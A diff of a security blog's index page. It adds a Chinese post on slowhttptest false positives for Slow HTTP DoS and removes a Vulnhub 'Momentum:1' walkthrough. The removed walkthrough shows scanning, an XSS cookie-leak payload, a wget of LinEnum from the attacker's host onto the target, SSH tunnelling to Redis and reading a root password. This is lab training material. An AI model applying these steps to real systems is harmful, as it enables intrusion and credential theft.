@@ -82,6 +82,61 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/25/Slowhttptest-Usage/">
+                Slowhttptest Usage
+            </a>
+        </h2>
+    
+    <time>
+        Aug 25, 2022
+    </time>
+    <section class="content">
+        <h1><span id="slowhttptest-对-slow-http-dos-的误判">Slowhttptest 对 Slow HTTP Dos 的误判</span></h1><h2><span id="当场滑跪">当场滑跪</span></h2><blockquote>
+<p>前段时间在巡检公司项目的时候发现了<a href="https://szczecin.github.io/2022/08/08/Slow-HTTP-Dos/">HTTP慢速拒绝服务攻击（Slow HTTP Dos）</a><br>于是就下发让项目运维去修复了，但是反馈说明明配置了正确的参数，于是我当（zhi）场（jie）滑（dao）跪（qian） ORZ</p>
+<p><img src="/2022/08/25/Slowhttptest-Usage/1.jpg" alt="image"></p>
+</blockquote>
+<h2><span id="发生了什么">发生了什么</span></h2><blockquote>
+<p>所以是发生了什么？漏扫就那么垃圾和我过不去这么多误报？我还好好用 slowhttptest 去验证了，确实存在<code>service available:   NO</code>的显示，图就不发了，拿阿B的给你们看看：<br><img src="/2022/08/25/Slowhttptest-Usage/1.png" alt="image"></p>
+<p>后来看得多了我发现（其实早就发现了），slowhttptest 的<code>slowbody</code>模式下很容易出现<code>service available:   NO</code>，<code>read</code>和<code>header</code>就很容易通过测试<br>但是归根到底是否触发拒绝服务，肯定看：</p>
+<ul>
+<li><ol>
+<li>网站载入延时</li>
+</ol>
+</li>
+<li><ol start="2">
+<li>网站是否还可访问</li>
+</ol>
+</li>
+</ul>
+<p>在看了<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41901122/article/details/114143913">星球守护者</a> 的漏洞复现后我发现，用 slowhttptest 验证 Slow HTTP Dos 真实存在，需要注意：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. slow HTTP test status on Xth second:		X 数字较小，即较早就开始拒绝服务</span><br><span class="line">2. service available:   NO</span><br><span class="line">3. Test ended on X+1th second</span><br><span class="line">4. Exit status: Connection refused		这两点比较重要，真的拒绝服务了直接下一秒就停止测试了</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2022/08/25/Slowhttptest-Usage/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="不得不说">不得不说</span></h2><blockquote>
+<p>其实 Dos 类的漏洞你很不好说，因为访问量过大必然服务器承受不住，这个只能做缓解（流量分析、请求时限、扩容等等）<br>所以漏扫出来是否存在这个漏洞或者 slowhttptest 的<code>service available:   NO</code>，有可能是看片面了（某些请求在开始或者后来被识别后被拒绝、中断，或者网页响应时间是否有某个范围内的增量变化等，尤其是这个增量变化，我曾经发现因为一个资产页面正常请求的数量会变化，时延直接从几百ms级变成几s级的）</p>
+<p>好吧，okk</p>
+<p><img src="/2022/08/25/Slowhttptest-Usage/2.jpg" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2022/08/24/Shuriken-Node/">
                 Shuriken Node
             </a>
@@ -787,99 +842,6 @@
 
 <p><img src="/2022/08/15/Momentum-2/23.png" alt="image-"></p>
 <p><img src="/2022/08/15/Momentum-2/24.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/15/Momentum-1/">
-                Momentum 1
-            </a>
-        </h2>
-    
-    <time>
-        Aug 15, 2022
-    </time>
-    <section class="content">
-        <h1><span id="momentum1">Momentum:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称momentum1">名称：Momentum:1</span></h4><h4><span id="发布日期2021422">发布日期：2021.4.22</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名momentumova">文件名：Momentum.ova</span></h4><h4><span id="文件大小662mb">文件大小：662MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentumova">下载地址：</span></h4><h4><span id="md5-556bea96fe2cb1506814d1e79f5c5e19">MD5: 556BEA96FE2CB1506814D1E79F5C5E19</span></h4><h4><span id="sha1-40c918a7eff2eb3cf1708428a583702a4bffd96c">SHA1: 40C918A7EFF2EB3CF1708428A583702A4BFFD96C</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Momentum和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/15/Momentum-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.106 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/4.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现四个可见目录，可以去看看：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.106 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="xss漏洞利用">XSS漏洞利用</span></h3><blockquote>
-<p>1.访问192.168.56.106&#x2F;js，发现有一个main.js，js里有个重定向链接opus-details.php?id&#x3D;，后面拼接了个参数str，而这个php是主页图片点击后再点击一次的详情介绍：</p>
-<p><img src="/2022/08/15/Momentum-1/7.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/8.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/9.png" alt="image-"></p>
-<p>2.拼接的str字串会被直接打印出来，因为是js下进行构建的，首先想到xss，构造xss的payload爆出cookie：</p>
-<p><img src="/2022/08/15/Momentum-1/10.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/11.png" alt="image-"></p>
-<p>3.这cookie明显是进行了加密，回到main.js有提示，使用的是aes，进行解密得到很像用户名-密码的形式的字串auxerre-alienum##：</p>
-<p><img src="/2022/08/15/Momentum-1/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录准备提权">SSH登录，准备提权</span></h3><blockquote>
-<p>1.因为靶机有开放22端口，利用ssh登录，发现用户auxerre的密码就是auxerre-alienum##：</p>
-<p><img src="/2022/08/15/Momentum-1/13.png" alt="image-"></p>
-<p>2.接下来我们要使用LinEnum.sh这个工具对靶机进行进一步信息收集，在kali搭建一个http服务，准备上传工具到靶机<br>（工具地址：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh%EF%BC%89%EF%BC%9A">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh）：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/14.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8001/LinEnum.sh，靶机下载工具（文件在桌面）</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/15.png" alt="image-"></p>
-<p>3.添加权限，靶机运行LinEnum.sh后，查看输出信息，发现6379端口占用，此端口是数据库redis的默认端口，确认后可以尝试kali登录redis：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh &gt; 1.txt</span><br><span class="line">cat 1.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/16.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/17.png" alt="image-"></p>
-<p><img src="/2022/08/15/Momentum-1/18.png" alt="image-"></p>
-<p>4.现在我们可以尝试利用ssh远程连接6379端口，然后在kali端登录，这里kali同样使用6379端口：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 6379:127.0.0.1:6379 auxerre@192.168.56.106</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/20.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.我们可以在数据库内看到一个rootpass键，而键内包含着很像是密码的字串，使用root用户登录，成功提权：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br><span class="line">get rootpass</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/Momentum-1/21.png" alt="image-"></p>
-<p>2.进行root登录，在&#x2F;root目录下能找到flag，即root.txt：</p>
-<p><img src="/2022/08/15/Momentum-1/22.png" alt="image-"></p>
 </blockquote>
 
 
